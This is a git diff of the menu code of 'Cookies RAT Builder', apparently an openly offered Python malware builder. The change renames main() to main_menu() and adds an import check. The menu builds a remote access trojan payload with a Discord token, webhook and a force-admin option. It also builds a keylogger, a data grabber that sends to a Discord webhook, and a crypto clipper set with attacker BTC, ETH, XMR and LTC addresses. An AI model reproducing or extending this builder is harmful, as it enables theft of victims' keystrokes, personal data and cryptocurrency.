@@ -13,7 +13,7 @@ from util.create_data_grabber import Create_Data_Grabber
 '''
 MAIN MENU
 '''
-def main():
+def main_menu():
     clear()
     settitle(f"Cookies RAT Builder")
     
@@ -34,13 +34,13 @@ def main():
         force_admin = str(input(
             f'{Fore.CYAN}Do u want the payload to create with force admin {Fore.YELLOW}>> {Fore.RESET}'))
         CookiesRAT(token, webhook, serverID, fileName, force_admin)
-        main()
+        main_menu()
 
     elif choice == '2':     # Create Custom PayLoad
         clear()
         print(f"{Fore.LIGHTRED_EX}Still in development. . .{Fore.RESET}")
         sleep(1)
-        main()
+        main_menu()
 
     elif choice == '3':     # Create Keylogger Add on
         clear()
@@ -49,14 +49,14 @@ def main():
         intervals = str(input(
             f'{Fore.CYAN}Enter intervals (default 60) {Fore.YELLOW}>> {Fore.RESET}'))
         Create_KeyLogger(webhook, intervals)
-        main()
+        main_menu()
 
     elif choice == '4':     # Create Data Grabber Add on
         clear()
         webhook = str(input(
             f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
         Create_Data_Grabber(webhook)
-        main()
+        main_menu()
 
     elif choice == '5':     # Create Crypto Clipper Add on
         clear()
@@ -69,7 +69,7 @@ def main():
         ltc = str(input(
             f'{Fore.CYAN}Enter LTC address {Fore.YELLOW}>> {Fore.RESET}'))
         Create_Crypto_Clipper(btc, eth, mon, ltc)
-        main()
+        main_menu()
 
     elif choice == '420':   # Exit RAT Builder
         settitle("Exiting...")
@@ -80,9 +80,19 @@ def main():
         clear()
         print(f"{Fore.LIGHTRED_EX}Please enter a valid choice{Fore.RESET}")
         sleep(1)
-        main()
+        main_menu()
 
 
 
 if __name__ == "__main__":
-    main()
+    '''
+    Try importing modules
+    '''
+    try: from assets.modules import *
+    except Exception as e:
+        clear() # Clear screen to fix color issues
+        print(f"{Fore.LIGHTRED_EX}Please run the setup.bat again, if this problem persists contact CookiesKush420{Fore.RESET} {e}")
+        input("\n\nPress enter to exit...")
+        exit()
+    
+    main_menu()
